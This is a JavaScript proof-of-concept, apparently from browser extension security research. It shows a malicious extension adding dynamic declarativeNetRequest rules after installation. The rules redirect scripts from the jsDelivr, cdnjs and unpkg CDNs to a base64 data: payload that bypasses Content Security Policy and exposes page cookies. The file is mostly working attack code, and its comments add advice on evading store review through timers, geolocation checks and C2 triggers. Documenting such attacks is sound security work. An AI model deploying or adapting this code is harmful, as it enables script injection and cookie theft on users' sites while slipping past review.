// Dynamic Rules Attack Variant
//
// This script demonstrates how a malicious extension can add redirect rules
// AFTER installation, evading App Store static analysis review.
//
// To test: paste this into the extension's background page console,
// or call it from the service worker after a delay/trigger.

async function addMaliciousRules() {
  // Payload: document.body.innerHTML = '<h1>CSP BYPASSED via Dynamic Rule</h1>'
  // + '<p>Origin: ' + location.origin + '</p>'
  // + '<p>Cookies: ' + document.cookie + '</p>';
  const payload = btoa(
    "document.body.innerHTML = '<h1 style=\"color:red\">CSP BYPASSED (Dynamic Rule)</h1>'" +
    " + '<p>Origin: ' + location.origin + '</p>'" +
    " + '<p>Cookies: ' + document.cookie + '</p>'"
  );

  await chrome.declarativeNetRequest.updateDynamicRules({
    addRules: [
      {
        id: 100,
        priority: 1,
        action: {
          type: "redirect",
          redirect: {
            regexSubstitution: `data:text/javascript;base64,${payload}`
          }
        },
        condition: {
          // Target any popular CDN that appears in CSP allowlists
          regexFilter: "https://cdn\\.jsdelivr\\.net/npm/.*\\.js",
          resourceTypes: ["script"]
        }
      },
      {
        id: 101,
        priority: 1,
        action: {
          type: "redirect",
          redirect: {
            regexSubstitution: `data:text/javascript;base64,${payload}`
          }
        },
        condition: {
          regexFilter: "https://cdnjs\\.cloudflare\\.com/ajax/libs/.*\\.js",
          resourceTypes: ["script"]
        }
      },
      {
        id: 102,
        priority: 1,
        action: {
          type: "redirect",
          redirect: {
            regexSubstitution: `data:text/javascript;base64,${payload}`
          }
        },
        condition: {
          regexFilter: "https://unpkg\\.com/.*\\.js",
          resourceTypes: ["script"]
        }
      }
    ]
  });

  console.log("[ATTACK] Dynamic redirect rules added for jsdelivr, cdnjs, unpkg");
  console.log("[ATTACK] Any page with CSP allowing these CDNs is now vulnerable");
}

// In a real attack, this would be triggered conditionally:
// - After a timer (evade review sandbox timeout)
// - After checking geolocation (target specific regions)
// - After receiving a C2 signal via storage.sync
// addMaliciousRules();
